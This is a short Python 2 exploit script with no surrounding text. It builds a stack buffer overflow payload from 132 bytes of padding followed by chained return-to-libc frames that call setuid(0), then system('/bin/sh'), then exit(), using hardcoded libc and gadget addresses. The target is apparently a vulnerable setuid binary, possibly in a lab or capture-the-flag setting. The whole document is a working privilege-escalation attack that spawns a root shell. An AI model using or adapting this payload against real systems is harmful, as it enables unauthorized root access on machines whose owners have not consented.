#!/usr/bin/python
import struct

padding = "A" * 132

setuid_frame  = struct.pack("<I", 0xf7ea5170) # &setuid()
setuid_frame += struct.pack("<I", 0x080482e9) # pop-ret
setuid_frame += struct.pack("<I", 0x00000000) # 0x0

system_frame  = struct.pack("<I", 0xf7e2eda0) # &system()
system_frame += struct.pack("<I", 0x080482e9) # pop-ret
system_frame += struct.pack("<I", 0xf7f4f82b) # "/bin/sh"

exit_frame  = struct.pack("<I", 0xf7e229d0)   # &exit()
exit_frame += struct.pack("<I", 0xdeadbeef)   # fake return address
exit_frame += struct.pack("<I", 0x00000000)   # 0x0

print padding + setuid_frame + system_frame + exit_frame
